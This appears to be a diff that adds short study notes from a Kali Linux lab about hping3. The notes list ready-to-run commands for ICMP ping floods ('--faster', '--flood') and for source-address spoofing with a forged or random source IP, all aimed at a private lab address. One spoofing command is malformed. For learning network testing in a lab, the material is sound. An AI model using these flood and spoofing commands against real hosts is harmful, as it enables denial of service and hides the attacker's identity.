@@ -1,0 +1,35 @@
+in kali 
+
+
+Hping3
+_______________________________________________
+
+hping3 -1 -c 1 10.0.2.15 (one packet sent only 1)
+
+hping3 -1 -c 6 -i 5 10.0.2.15 (send 6 packets and each in 5 second distance)
+
+
+hping3 -1 --fast 10.0.2.15  
+
+
+hping3 -1 --faster 10.0.2.15 (ping flood attack)
+
+
+
+
+Dangurus attack with flood keyword
+hping3 -1 --flood 10.0.2.15  
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Spoofing
+______________________________________________
+
+fake ip attack cerate and attack to victm
+hping -1  -a 192.168.1.1 -c 10.0.2.15
+
+
+attack using random ipaddress to victm
+hping -1 --rand-source -c 1 10.0.2.15 (send one packet)
+
+
